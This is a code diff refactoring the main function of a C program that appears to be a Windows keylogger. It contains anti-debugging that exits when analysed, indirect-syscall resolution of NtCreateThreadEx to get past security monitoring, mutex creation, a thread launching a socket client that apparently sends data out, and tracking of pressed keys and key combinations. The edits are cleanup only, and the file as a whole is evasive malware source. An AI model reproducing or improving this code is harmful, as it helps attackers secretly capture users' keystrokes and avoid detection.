@@ -10,16 +10,15 @@
 #include "main.h"
 
 
-void isDebuggerModeOn() {
-    if (_checkDebugger() != 0) {
-        exit(0);
-    }
+BOOL isDebuggerDetected() {
+    return _checkDebugger() != 0;
 }
 
 int main() {
-    isDebuggerModeOn();
+    if (isDebuggerDetected()) {
+        return 0;
+    }
 
-    BOOL State = TRUE;
     HMODULE NtdllHandle = NULL;
     PVOID Buffer = NULL;
     HANDLE thread = NULL;
@@ -29,7 +28,7 @@ int main() {
 
     NtdllHandle = getModuleHandle();
     if (NtdllHandle == NULL) {
-        exit(0);
+        return 0;
     } 
 
     IndirectPrelude(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
@@ -45,21 +44,21 @@ int main() {
 
     AppContext ctx = {combinations, pressedKeys, keys, set};
     if (!initAppContext(&ctx)) {
-        State = FALSE; goto CLEANUP;
+        goto CLEANUP;
     }
 
     if (!initStrings(&result, &userId)) {
-        State = FALSE; goto CLEANUP;
+        goto CLEANUP;
     }
 
     Status = NtCreateMutant(&hMutex, SYNCHRONIZE, NULL, FALSE);
     if (STATUS_SUCCESS != Status) {
-        State = FALSE; goto CLEANUP;
+        goto CLEANUP;
     }
 
     Status = NtCreateThreadEx(&thread, THREAD_QUERY_INFORMATION, NULL, GetCurrentProcess(), (long int (*)(void *))initSocketClient, NULL, FALSE, 0, 0, 0, NULL);
     if (STATUS_SUCCESS != Status) {
-        State = FALSE; goto CLEANUP;
+        goto CLEANUP;
     }
 
     start(ctx.pressedKeys, ctx.keys, ctx.combinations, ctx.set);
@@ -87,10 +86,6 @@ CLEANUP:
     if (result != NULL) {
         free(result);
         result = NULL;
-    }
-
-    if (State) {
-        exit(0);
     }
 
     return 0;
